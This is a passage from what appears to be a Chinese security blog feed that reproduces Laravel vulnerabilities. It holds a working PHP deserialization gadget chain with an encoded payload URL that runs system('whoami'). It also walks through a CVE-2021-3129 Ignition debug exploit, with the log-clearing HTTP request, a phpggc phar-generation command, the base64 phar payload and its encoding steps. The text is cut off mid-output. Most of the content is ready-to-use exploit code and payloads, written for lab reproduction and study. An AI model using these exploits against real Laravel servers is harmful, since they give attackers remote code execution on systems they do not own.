class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$callback</span> =&gt; system</span><br><span class="line"><span class="variable">$parameters</span> =&gt; [<span class="string">&#x27;whoami&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最终命令执行完成，exp 为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings[<span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>][<span class="string">&#x27;concrete&#x27;</span>] = <span class="string">&quot;Illuminate\Foundation\Application&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultGenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>([1,2]);</span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        <span class="variable">$defaultGenerator</span>,</span><br><span class="line">        <span class="variable">$application</span>,</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,</span><br><span class="line">        [<span class="string">&quot;whoami&quot;</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.136.167&#x2F;index.php&#x2F;user?user&#x3D;O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A2%3A%7Bi%3A0%3Bi%3A1%3Bi%3A1%3Bi%3A2%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7D</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对照着其他师傅的文章分析都有点吃力，还是太菜了，里边还有各种地方都很有问题，之后继续努力吧。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> cve </tag>
            
            <tag> 反序列化链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel＜=8.4.2 Debug RCE</title>
      <link href="2021/01/21/laravel%EF%BC%9C-8-4-2-Debug-RCE/"/>
      <url>2021/01/21/laravel%EF%BC%9C-8-4-2-Debug-RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>laravel &lt;= 8.4.2<br>Ignition &lt;= 2.5.1<br>开启debug</p><h2 id="CVE编号"><a href="#CVE编号" class="headerlink" title="CVE编号"></a>CVE编号</h2><p>CVE-2021-3129</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><h3 id="清空-log"><a href="#清空-log" class="headerlink" title="清空 log"></a>清空 log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.136.167:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.136.167:8000&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 320</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;laravel&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="生成phar文件并base64"><a href="#生成phar文件并base64" class="headerlink" title="生成phar文件并base64"></a>生成phar文件并base64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d&#39;phar.readonly&#x3D;0&#39; .&#x2F;phpggc monolog&#x2F;rce1 call_user_func phpinfo --phar phar -o php:&#x2F;&#x2F;output | base64 -w0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrZAgAAAgAAABEAAAABAAAAAACCAgAATzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czo3OiJwaHBpbmZvIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6MTQ6ImNhbGxfdXNlcl9mdW5jIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6NzoicGhwaW5mbyI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5pdGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX19BQAAAGR1bW15BAAAANNQBGAEAAAADH5&#x2F;2LQBAAAAAAAACAAAAHRlc3QudHh0BAAAANNQBGAEAAAADH5&#x2F;2LQBAAAAAAAAdGVzdHRlc3R5dqEGHXRSkD3PRm3X6&#x2F;hNNh1MXQIAAABHQk1C</span><br></pre></td></tr></table></figure><h3 id="quoted-printable-encode"><a href="#quoted-printable-encode" class="headerlink" title="quoted-printable-encode"></a>quoted-printable-encode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python 3.8.5 (default, Jul 28 2020, 12:59:40) </span><br><span class="line">[GCC 9.3.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; a &#x3D; &#39;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrZAgAAAgAAABEAAAABAAAAAACCAgAATzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czo3OiJwaHBpbmZvIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6MTQ6ImNhbGxfdXNlcl9mdW5jIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6NzoicGhwaW5mbyI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5pdGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX19BQAAAGR1bW15BAAAANNQBGAEAAAADH5&#x2F;2LQBAAAAAAAACAAAAHRlc3QudHh0BAAAANNQBGAEAAAADH5&#x2F;2LQBAAAAAAAAdGVzdHRlc3R5dqEGHXRSkD3PRm3X6&#x2F;hNNh1MXQIAAABHQk1C&#39;</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.join([&quot;&#x3D;&quot; + hex(ord(i))[2:] + &quot;&#x3D;00&quot; for i in a]).upper()</span><br><span class="line">&#39;&#x3D;50&#x3D;00&#x3D;44&#x3D;00&#x3D;39&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;49&#x3D;00&#x3D;51&#x3D;00&#x3D;55&#x3D;00&#x3D;78&#x3D;00&#x3D;55&#x3D;00&#x3D;58&#x3D;00&#x3D;30&#x3D;00&#x3D;4E&#x3D;00&#x3D;50&#x3D;00&#x3D;54&#x3D;00&#x3D;56&#x3D;00&#x3D;42&#x3D;00&#x3D;4A&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;56&#x3D;00&#x3D;53&#x3D;00&#x3D;4B&#x3D;00&#x3D;43&#x3D;00&#x3D;6B&#x3D;00&#x3D;37&#x3D;00&#x3D;49&#x3D;00&#x3D;44&#x3D;00&#x3D;38&#x3D;00&#x3D;2B&#x3D;00&#x3D;44&#x3D;00&#x3D;51&#x3D;00&#x3D;72&#x3D;00&#x3D;5A&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;7A&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;46&#x3D;00&#x3D;4E&#x3D;00&#x3D;35&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;56&#x3D;00&#x3D;6B&#x3D;00&#x3D;63&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;61&#x3D;00&#x3D;32&#x3D;00&#x3D;56&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;50&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;4E&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;35&#x3D;00&#x3D;76&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;39&#x3D;00&#x3D;6E&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;63&#x3D;00&#x3D;51&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;53&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;41&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;59&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;55&#x3D;00&#x3D;32&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;53&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;33&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;76&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;55&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;64&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;73&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;4F&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;34&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;46&#x3D;00&#x3D;73&#x3D;00&#x3D;61&#x3D;00&#x3D;58&#x3D;00&#x3D;70&#x3D;00&#x3D;6C&#x3D;00&#x3D;5A&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;78&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#